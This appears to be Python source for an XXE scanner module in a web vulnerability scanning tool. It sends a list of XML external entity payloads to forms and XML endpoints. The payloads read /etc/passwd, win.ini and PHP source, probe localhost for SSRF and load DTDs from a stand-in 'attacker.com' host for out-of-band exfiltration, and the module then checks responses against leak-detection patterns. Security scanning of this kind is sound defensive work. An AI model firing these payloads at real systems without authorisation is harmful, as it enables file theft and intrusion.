import logging
from urllib.parse import urlparse, parse_qs
from ..http_client import HttpClient
import re
from typing import List, Dict, Optional, Union
from .base_scanner import BaseScanner

logger = logging.getLogger(__name__)

class XXEScanner(BaseScanner):
    def __init__(self, client=None):
        super().__init__(client)
        
        # XML payloads for XXE testing
        self.payloads = [
            # Basic XXE
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>""",

            # XXE with PHP filter to read source code
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
<foo>&xxe;</foo>""",

            # XXE to read Windows files
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
<foo>&xxe;</foo>""",

            # XXE to perform SSRF
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://localhost:22" >]>
<foo>&xxe;</foo>""",

            # XXE with parameter entities
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % load "<!ENTITY &#x25; send SYSTEM 'file:///dummy/%xxe;'>">
%load;
%send;]>
<foo>test</foo>""",

            # XXE with DTD file
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;]>
<foo>test</foo>""",

            # XXE with CDATA
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo><![CDATA[&xxe;]]></foo>""",

            # XXE with error-based exfiltration
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;]>
<foo>test</foo>""",

            # XXE with out-of-band exfiltration
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/collect.dtd">
%dtd;]>
<foo>test</foo>""",

            # XXE with UTF-16 encoding
            """<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>""",

            # XXE with XInclude
            """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>""",

            # XXE with SVG
            """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>""",

            # XXE with SOAP
            """<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
<soap:Body>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
</soap:Body>
</soap:Envelope>"""
        ]
        
        # Patterns that might indicate a successful XXE
        self.xxe_patterns = [
            # Unix file content patterns
            r"root:.*:0:0:",                       # /etc/passwd
            r"nobody:.*:65534:65534:",             # /etc/passwd
            r"www-data:.*:33:33:",                 # /etc/passwd
            r"\[boot loader\]",                    # win.ini
            r"extension=",                         # php.ini
            
            # Base64 encoded content (for PHP filter)
            r"^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$",
            
            # Error messages that might reveal XXE
            r"(SimpleXMLElement|DOMDocument|XMLReader)::",
            r"Warning: simplexml_load_",
            r"XML (parsing|syntax) error",
            r"unterminated entity reference",
            r"Start tag expected",
            r"XML declaration allowed only at the start of the document",
            r"error parsing attribute name",
            r"error parsing CDATA section",
            
            # Web server config patterns
            r"<VirtualHost",                       # Apache config
            r"<Directory",                         # Apache config
            r"RewriteEngine",                      # .htaccess
            r"<configuration>",                    # web.config
            r"<system.webServer>",                 # web.config
            
            # Application config patterns
            r"DB_CONNECTION|DB_HOST|DB_PORT|DB_DATABASE|DB_USERNAME|DB_PASSWORD", # Laravel .env
            r"DJANGO_SETTINGS_MODULE",             # Django settings
            r"define\s*\(\s*['\"](DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)['\"]", # WordPress config
            r"spring.datasource",                  # Spring application.properties
            r"jdbc:mysql",                         # JDBC connection string
            r"mongodb://",                         # MongoDB connection string
            
            # Specific file content signatures
            r"# /etc/fstab",
            r"# /etc/hosts",
            r"proc\s+/proc\s+proc",
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost"
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        vulnerabilities = []
        
        try:
            # Check forms for XML processing
            if forms:
                for form in forms:
                    try:
                        form_fields = form.get('fields', [])
                        if not isinstance(form_fields, list):
                            logger.warning(f"Invalid form fields type: {type(form_fields)}")
                            continue
                        
                        method = form.get('method', 'POST').upper()
                        action = form.get('action', '')
                        if not action:
                            logger.warning("Form has no action URL")
                            continue
                        
                        # Check if form might accept XML input
                        if self._is_potential_xml_endpoint(form):
                            for payload in self.payloads:
                                try:
                                    # For XML endpoints, we'll try sending the payload directly
                                    headers = {'Content-Type': 'application/xml'}
                                    response = self.client.post(action, data=payload, headers=headers, timeout=5)
                                    
                                    if response and self._is_vulnerable(response.text, payload):
                                        vulnerabilities.append({
                                            'type': 'XXE',
                                            'url': action,
                                            'payload': payload,
                                            'evidence': self._get_evidence(response.text, payload),
                                            'severity': 'critical',
                                            'param': 'XML Input',
                                            'method': 'POST'
                                        })
                                        
                                    # Also try with text/xml content type
                                    headers = {'Content-Type': 'text/xml'}
                                    response = self.client.post(action, data=payload, headers=headers, timeout=5)
                                    
                                    if response and self._is_vulnerable(response.text, payload):
                                        vulnerabilities.append({
                                            'type': 'XXE',
                                            'url': action,
                                            'payload': payload,
                                            'evidence': self._get_evidence(response.text, payload),
                                            'severity': 'critical',
                                            'param': 'XML Input',
                                            'method': 'POST'
                                        })
                                except Exception as e:
                                    logger.error(f"XXE scan error for XML endpoint {action}: {str(e)}")
                            
                            # Try to identify XML fields in the form
                            xml_fields = self._identify_xml_fields(form_fields)
                            
                            for field in xml_fields:
                                for payload in self.payloads:
                                    try:
                                        test_data = {}
                                        for f in form_fields:
                                            f_name = f.get('name') if isinstance(f, dict) else f
                                            test_data[f_name] = payload if f_name == field else 'test'
                                        
                                        if method == 'POST':
                                            response = self.client.post(action, data=test_data, timeout=5)
                                        elif method == 'GET':
                                            response = self.client.get(action, params=test_data, timeout=5)
                                        else:
                                            logger.warning(f"Unsupported form method: {method}")
                                            continue
                                        
                                        if response and self._is_vulnerable(response.text, payload):
                                            vulnerabilities.append({
                                                'type': 'XXE',
                                                'url': action,
                                                'payload': payload,
                                                'evidence': self._get_evidence(response.text, payload),
                                                'severity': 'critical',
                                                'param': field,
                                                'method': method
                                            })
                                    except Exception as e:
                                        logger.error(f"XXE form scan error for field {field}: {str(e)}")
                    except Exception as e:
                        logger.error(f"XXE form scan error: {str(e)}")
            
            # Check if the URL itself might be an XML endpoint
            parsed = urlparse(url)
            path = parsed.path.lower()
            if (path.endswith('.xml') or 
                path.endswith('/xml') or 
                'xml' in path or 
                'soap' in path or 
                'wsdl' in path):
                
                for payload in self.payloads:
                    try:
                        # Try POST with XML payload
                        headers = {'Content-Type': 'application/xml'}
                        response = self.client.post(url, data=payload, headers=headers, timeout=5)
                        
                        if response and self._is_vulnerable(response.text, payload):
                            vulnerabilities.append({
                                'type': 'XXE',
                                'url': url,
                                'payload': payload,
                                'evidence': self._get_evidence(response.text, payload),
                                'severity': 'critical',
                                'param': 'XML Input',
                                'method': 'POST'
                            })
                    except Exception as e:
                        logger.error(f"XXE scan error for potential XML endpoint {url}: {str(e)}")
        
        except Exception as e:
            logger.error(f"XXE scan error: {str(e)}")
        
        return vulnerabilities

    def _is_potential_xml_endpoint(self, form: Dict) -> bool:
        """Check if a form might accept XML input"""
        # Check form attributes
        form_enctype = form.get('enctype', '').lower()
        if 'xml' in form_enctype:
            return True
            
        # Check form action URL
        action = form.get('action', '').lower()
        if (action.endswith('.xml') or 
            action.endswith('/xml') or 
            'xml' in action or 
            'soap' in action or 
            'wsdl' in action):
            return True
            
        # Check form fields
        fields = form.get('fields', [])
        for field in fields:
            field_name = field.get('name', '') if isinstance(field, dict) else field
            field_type = field.get('type', '') if isinstance(field, dict) else ''
            
            if field_name and isinstance(field_name, str):
                field_name = field_name.lower()
                if 'xml' in field_name or 'soap' in field_name or 'wsdl' in field_name:
                    return True
            
            if field_type and isinstance(field_type, str):
                field_type = field_type.lower()
                if field_type == 'file' or 'xml' in field_type:
                    return True
                    
        return False

    def _identify_xml_fields(self, fields: List) -> List[str]:
        """Identify form fields that might accept XML input"""
        xml_fields = []
        
        suspicious_names = [
            'xml', 'xmldata', 'xmlfile', 'xmlinput', 'xmlpayload', 'xmlrequest',
            'soap', 'soaprequest', 'soapdata', 'soapbody', 'soapmessage',
            'wsdl', 'xsd', 'dtd', 'rss', 'feed', 'atom', 'rdf', 'xhtml',
            'document', 'file', 'upload', 'import', 'content', 'data'
        ]
        
        for field in fields:
            field_name = field.get('name') if isinstance(field, dict) else field
            field_type = field.get('type') if isinstance(field, dict) else None
            
            if not field_name:
                continue
                
            field_name_lower = field_name.lower()
            
            # Check if field name suggests XML input
            if any(suspicious in field_name_lower for suspicious in suspicious_names):
                xml_fields.append(field_name)
                
            # Check if field type is file or textarea (common for XML input)
            if field_type and (field_type == 'file' or field_type == 'textarea'):
                xml_fields.append(field_name)
                
        return xml_fields

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        # Check for patterns that indicate successful XXE
        for pattern in self.xxe_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
                
        # Additional checks for specific payloads
        if "passwd" in payload and ("root:" in response_text or "nobody:" in response_text):
            return True
            
        if "win.ini" in payload and "[boot loader]" in response_text:
            return True
            
        # Check for base64 encoded content (for PHP filter)
        if "php://filter/convert.base64-encode" in payload:
            # Look for base64 encoded content in the response
            base64_pattern = r"[A-Za-z0-9+/]{20,}={0,2}"
            if re.search(base64_pattern, response_text):
                return True
                
        return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        # Extract evidence of XXE vulnerability
        for pattern in self.xxe_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return f"XXE pattern detected: {match.group(0)}"
                
        # If we couldn't find a specific pattern but determined it's vulnerable
        if "passwd" in payload and ("root:" in response_text or "nobody:" in response_text):
            return "File content leaked: /etc/passwd"
                
        if "win.ini" in payload and "[boot loader]" in response_text:
            return "File content leaked: windows/win.ini"
                
        # Check for base64 encoded content (for PHP filter)
        if "php://filter/convert.base64-encode" in payload:
            base64_pattern = r"[A-Za-z0-9+/]{20,}={0,2}"
            match = re.search(base64_pattern, response_text)
            if match:
                return "Base64 encoded file content leaked (possible source code disclosure)"
                
        return "XXE vulnerability detected through response analysis"
